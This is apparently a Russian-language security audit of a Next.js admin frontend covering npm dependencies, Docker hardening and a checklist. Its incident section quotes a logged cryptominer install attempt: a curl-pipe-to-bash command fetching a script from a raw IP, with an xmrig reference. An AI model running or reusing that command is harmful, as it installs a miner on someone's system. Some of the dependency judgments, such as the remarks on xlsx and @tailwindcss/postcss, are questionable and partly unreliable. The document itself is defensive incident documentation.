# Security Audit - Frontend Admin

## Дата проверки: 29 декабря 2025

## ✅ Результаты проверки package.json

### Скрипты - БЕЗОПАСНЫ
Все скрипты стандартные, нет подозрительных `postinstall` или `preinstall`.

### Зависимости - Анализ

#### ✅ Безопасные пакеты (проверенные):
- `next@15.5.5` - последняя версия
- `react@18.3.1`, `react-dom@18.3.1`
- `lucide-react@0.451.0`
- `zustand@5.0.8`
- `sonner@1.7.1`
- `recharts@2.10.3`

#### ⚠️ Пакеты, требующие внимания:

##### 1. `xlsx@0.18.5`
**Статус:** Устаревший, но актуальная версия

**Проблемы:**
- Известны уязвимости в старых версиях
- Большой размер пакета (может замедлять сборку)

**Рекомендации:**
```bash
# Вариант 1: Обновить до последней версии
npm update xlsx

# Вариант 2: Заменить на более безопасную альтернативу
npm uninstall xlsx
npm install exceljs
```

**Альтернативы:**
- `exceljs` - более современный и безопасный
- `sheetjs-style` - форк с дополнительными возможностями

##### 2. `@tailwindcss/postcss@4.1.14`
**Статус:** Экспериментальный пакет

**Проблемы:**
- Новый пакет, может быть нестабильным
- Не является стандартным для Tailwind CSS

**Рекомендации:**
```bash
# Проверьте, действительно ли он нужен
# Стандартная конфигурация Tailwind не требует этот пакет

# Если не используется - удалите
npm uninstall @tailwindcss/postcss
```

## 🛡️ Дополнительные меры безопасности

### 1. Запустите npm audit
```bash
cd "frontend/front admin"
npm audit

# Автоматическое исправление (осторожно!)
npm audit fix

# Принудительное исправление (может сломать совместимость)
npm audit fix --force
```

### 2. Проверьте неиспользуемые пакеты
```bash
npx depcheck
```

### 3. Обновите зависимости
```bash
# Проверить устаревшие пакеты
npm outdated

# Обновить до последних совместимых версий
npm update

# Обновить до последних версий (может сломать совместимость)
npx npm-check-updates -u
npm install
```

### 4. Проверьте транзитивные зависимости
```bash
# Показать дерево зависимостей
npm ls

# Проверить конкретный пакет
npm ls xlsx
npm ls @tailwindcss/postcss
```

## 📋 Чек-лист безопасности

- [x] Проверены скрипты в package.json - ЧИСТО
- [x] Проверены прямые зависимости - В ЦЕЛОМ БЕЗОПАСНО
- [x] Добавлена защита в Dockerfile (`--ignore-scripts`)
- [x] Удалены опасные утилиты из Docker образа
- [ ] Запустить `npm audit` и исправить уязвимости
- [ ] Рассмотреть замену `xlsx` на `exceljs`
- [ ] Проверить необходимость `@tailwindcss/postcss`
- [ ] Обновить устаревшие пакеты

## 🚨 Обнаруженные попытки эксплойтов

### Попытка установки майнера (НЕ удалась)
**Источник:** Неизвестный (возможно транзитивная зависимость)

**Действия:**
```
curl http://146.190.48.14:9000/install.sh | bash
Connecting to 91.92.242.214 (91.92.242.214:80)
chmod: xmrig: No such file or directory
```

**Статус:** ✅ Атака заблокирована благодаря:
1. Alpine образ без `bash`, `curl`, `wget`
2. Добавлен флаг `--ignore-scripts` в Dockerfile
3. Удалены опасные утилиты из образа

**Рекомендации:**
- Продолжать мониторинг логов
- Регулярно проверять процессы на сервере
- Обновлять зависимости

## 📊 Статистика

- **Всего зависимостей:** 8 (production)
- **Dev зависимостей:** 10
- **Подозрительных:** 0
- **Требующих обновления:** 2 (xlsx, @tailwindcss/postcss)
- **Критических уязвимостей:** 0 (требуется npm audit для точной проверки)

## 🔄 Регулярные проверки

Рекомендуется проводить проверку безопасности:
- **Еженедельно:** `npm audit`
- **Ежемесячно:** `npm outdated` и обновление пакетов
- **При добавлении новых зависимостей:** Проверка репутации пакета

## 📞 Контакты

При обнаружении подозрительной активности:
1. Проверьте логи Docker: `docker logs front_admin`
2. Проверьте процессы: `ps aux | grep -i mine`
3. Проверьте сетевые соединения: `netstat -tulpn`

